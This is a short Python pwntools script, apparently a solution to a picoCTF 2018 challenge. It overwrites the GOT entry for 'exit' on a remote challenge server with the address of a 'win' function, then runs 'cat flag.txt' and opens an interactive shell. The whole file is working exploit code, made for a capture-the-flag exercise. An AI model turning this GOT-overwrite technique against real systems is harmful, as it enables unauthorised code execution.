#!/usr/bin/python
from pwn import *
from time import sleep

auth = ELF('./auth')
got = str(hex(auth.got['exit']))
win_func = str(hex(auth.symbols['win']))

log.info('Global Offset: {}'.format(got))
log.info('Win Function: {}'.format(win_func))

s = remote('2018shell1.picoctf.com', 54664)
print(s.recv())
print(got)
s.sendline(got)
sleep(1)
print(s.recv())

s.sendline(win_func)
s.sendline('cat flag.txt')
s.interactive()
s.close()
